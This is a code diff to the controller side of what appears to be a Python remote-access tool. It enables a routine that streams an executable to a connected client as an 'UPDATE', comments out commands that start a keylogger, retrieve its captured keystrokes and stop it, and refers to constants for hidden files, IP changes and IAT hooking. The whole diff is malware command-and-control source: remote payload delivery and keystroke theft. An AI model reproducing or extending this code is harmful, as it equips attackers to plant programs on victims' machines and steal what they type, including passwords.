@@ -10,7 +10,7 @@ KEY_LOGGER_FILE = r"keyLogger.txt"
 HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
 DIR_TO_MOVE = r"C:\Users\admin\Desktop\New folder"
 FILE_TO_MOVE = r"C:\Users\admin\Desktop\hidden files.txt"
-FILE_PATH = "C:\\Users\\admin\\Downloads\\calc.exe"
+FILE_PATH_TO_UPDATE = r"C:\Users\admin\Downloads\calc.exe"
 FILE_INFO_DIR = r"C:\Users\admin\Desktop\New folder"
 EXE_STR = "netstat -a -n -o"
 NEW_IP = "192.168.43.49"
@@ -33,24 +33,6 @@ def full_bin_file_to_buffer(file_path):
         data = fp.read()
     return data
 
-# def key_logger_thread(conn, log_file_path):
-#     while 1:
-#         logger_message = SocketManager.receive(conn)
-#         if logger_message == 'KEY_LOGGER_MESSAGE':
-#             logger_data = SocketManager.receive(conn)
-#             try:
-#                 with open(log_file_path, 'w') as fp:
-#                     fp.write(logger_data)
-#             except Exception as ex:
-#                 print("Directory does not exist")
-#                 print(ex)
-#                 # TODO: handle what happens if directory does not exist
-#
-#
-#
-#         # TODO: handle what happens if it's not the right message
-
-
 if __name__ == '__main__':
     TCP_IP = '127.0.0.1'
     TCP_PORT = 5009
@@ -69,16 +51,12 @@ if __name__ == '__main__':
         print('received data:', data)
         SocketManager.send_data(conn, data)
 
-        # # UPDATE:
-        # conn.send("UPDATE".encode())
-        # data = conn.recv(BUFFER_SIZE)  # ok for packgae
-        # for chunk in bin_file_to_buffer(FILE_PATH):
-        #     packet = chunk
-        #     print(packet)
-        #     conn.send(packet)
-        #     data = conn.recv(BUFFER_SIZE)  # ok for packgae
-        # conn.send("END_UPDATE".encode())
-        # data = conn.recv(BUFFER_SIZE)  # ok for packgae
+        # UPDATE:
+        SocketManager.send_data(conn, "UPDATE")
+        for chunk in bin_file_to_buffer(FILE_PATH_TO_UPDATE):
+            SocketManager.send_data(conn, chunk)
+
+        SocketManager.send_data(conn, "END_UPDATE")
 
         # Execute
         # SocketManager.send_data(conn, "EXECUTE")
@@ -133,33 +111,32 @@ if __name__ == '__main__':
         # print(data)
 
         # start key logger
-        if is_running_key_logger:
-            print("Key logger already running...")
-            # TODO: break
-        SocketManager.send_data(conn, "START_KEY_LOGGER")
-        is_running_key_logger = True
-        time.sleep(20)
-
-        # get key_logger_data
-        SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
-        key_logger_data = SocketManager.receive(conn)
-        try:
-           with open(KEY_LOGGER_FILE, 'ab') as fp:
-               fp.write(key_logger_data)
-
-        except Exception as ex:
-           print("Error openning file")
-           print(ex)
-        time.sleep(20)
-
-        # stop key logger
-        if not is_running_key_logger:
-           print("Currently, no key logger is running...")
-            # TODO: break
-        SocketManager.send_data(conn, "STOP_KEY_LOGGER")
-        time.sleep(20)
-        is_running_key_logger = False
-
+        # if is_running_key_logger:
+        #     print("Key logger already running...")
+        #     # TODO: break
+        # SocketManager.send_data(conn, "START_KEY_LOGGER")
+        # is_running_key_logger = True
+        # time.sleep(20)
+        #
+        # # get key_logger_data
+        # SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
+        # key_logger_data = SocketManager.receive(conn)
+        # try:
+        #    with open(KEY_LOGGER_FILE, 'ab') as fp:
+        #        fp.write(key_logger_data)
+        #
+        # except Exception as ex:
+        #    print("Error openning file")
+        #    print(ex)
+        # time.sleep(20)
+        #
+        # # stop key logger
+        # if not is_running_key_logger:
+        #    print("Currently, no key logger is running...")
+        #     # TODO: break
+        # SocketManager.send_data(conn, "STOP_KEY_LOGGER")
+        # time.sleep(20)
+        # is_running_key_logger = False
 
 
         # # IAT Hooking
